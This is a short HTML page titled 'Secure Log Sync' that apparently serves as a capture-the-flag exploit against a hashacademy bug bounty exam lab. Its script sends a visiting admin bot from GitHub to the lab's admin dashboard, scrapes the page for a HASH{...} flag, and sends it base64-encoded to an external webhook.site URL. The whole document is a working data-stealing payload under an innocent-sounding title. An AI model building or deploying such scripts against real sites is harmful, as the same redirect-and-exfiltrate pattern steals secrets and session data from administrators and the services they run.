<!DOCTYPE html>
<html>
<head><title>Secure Log Sync</title></head>
<body>
    <script>
     const webhook = "https://webhook.site/ab7f9788-3a2f-41f5-9c2d-84fb65487cc8";

const hunt = () => {
    const bodyText = document.body.innerText;
    const match = bodyText.match(/HASH\{[^}]+\}/);
    
    if (match) {
        // This sends the flag to your webhook
        fetch(webhook + "?WIN=" + btoa(match[0]));
    } else {
        // If the flag isn't loaded yet, try again in 1 second
        setTimeout(hunt, 1000);
    }
};

if (window.location.host.includes("hashacademy")) {
    // We are inside the lab! Start hunting.
    setTimeout(hunt, 3000);
} else {
    // We are on GitHub! Send the bot to the lab.
    window.location.href = "https://bugbounty-exam.hashacademy.co/admin/dashboard";
}
    </script>
</body>
</html>
